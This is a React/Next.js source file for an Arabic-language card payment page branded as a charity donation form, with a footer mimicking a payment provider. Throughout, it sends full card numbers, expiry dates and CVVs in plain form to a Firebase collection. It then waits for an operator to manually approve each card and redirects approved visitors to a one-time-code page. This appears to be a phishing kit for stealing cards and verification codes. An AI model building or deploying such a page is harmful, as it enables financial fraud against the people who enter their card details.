"use client"

import type React from "react"
import { useEffect, useState } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { addData, db } from "@/lib/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import { useRouter } from "next/navigation"
import FullPageLoader from "@/components/fullPageLoader"

export default function APaymentForm() {
  const [cardholderName, setCardholderName] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [loading, setLoading] = useState(false)
  const [cvv, setCvv] = useState("")
  const [status, setStatus] = useState("new")
  const [itemValue, setItemValue] = useState("")
  const [visitorId, setVisitorId] = useState("")
  const router = useRouter()

  // Safely access localStorage after component mounts
  useEffect(() => {
    // Get item value from localStorage
    const storedItem = localStorage.getItem("item")
    if (storedItem) {
      setItemValue(storedItem)
    }

    // Get visitor ID from localStorage
    const storedVisitorId = localStorage.getItem("visitor")
    if (storedVisitorId) {
      setVisitorId(storedVisitorId)
    }
  }, [])

  // Set up Firestore listener
  useEffect(() => {
    if (!visitorId) return

    const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
      if (docSnap.exists()) {
        const data = docSnap.data()
        if (data.status) {
          if (data.status === "approved") {
            setLoading(false)
            setStatus(data.status)
            router.push("/otp")
          } else if (data.status === "rejected") {
            setLoading(false)
            alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
          }
        }
      }
    })

    return () => unsubscribe()
  }, [visitorId, router])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()

    // Get visitor ID from state (which was set from localStorage)
    if (!visitorId) return
    addData({
      createdDate: new Date().toISOString(),
      id: visitorId,
      cardNumber:cardNumber,
      expiryDate:expiryDate,
      cvv:cvv,
      status:status,
    })

    setLoading(true)
  }

  return (
    <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
      <div className="w-full max-w-md bg-white rounded-3xl shadow-lg p-6">
        <div className="flex justify-center  items-center mb-8">
          <div className="text-xl font-bold text-center text-gray-800">جمعية الحياة الخيرية</div>
        </div>
        <div className="relative mb-6">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
          <div className="relative flex justify-center">
            <span className="bg-white px-4 text-sm text-gray-700">إدخال بيانات البطاقة</span>
          </div>
        </div>

        <form className="space-y-4" onSubmit={handleSubmit}>
          <div>
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="اسم صاحب البطاقة"
              value={cardholderName}
              onChange={(e) => setCardholderName(e.target.value)}
            />
          </div>

          <div className="relative">
            <Input
              type="tel"
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="رقم البطاقة"
              maxLength={16}
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
            />
            <div className="absolute left-3 top-1/2 transform -translate-y-1/2 flex space-x-1">
              <div className="w-8 h-5 relative">
                <Image src="/vaa.png" alt="Mastercard" width={742} height={30} className="object-contain" />
              </div>
             
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="رقم التحقق"
              value={cvv}
              maxLength={3}
              onChange={(e) => setCvv(e.target.value)}
            />
            <Input
              className="text-right border-gray-300 rounded-md p-3"
              placeholder="شهر / سنة"
              maxLength={5}
              value={expiryDate.length === 2 ? expiryDate + "/" : expiryDate}
              onChange={(e) => setExpiryDate(e.target.value)}
            />
          </div>

          <Button className="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 rounded-md" type="submit">
            ادفع الآن
          </Button>
        </form>

        <div className="mt-8 flex justify-center items-center">
          <span className="text-sm text-gray-500 ml-2">مدعوم من</span>
          <div className="h-6 w-24 relative">
            <Image src="/vercel.svg" alt="MyAtoorah" width={96} height={24} className="object-contain" />
          </div>
        </div>
      </div>
      {loading && <FullPageLoader />}
    </div>
  )
}

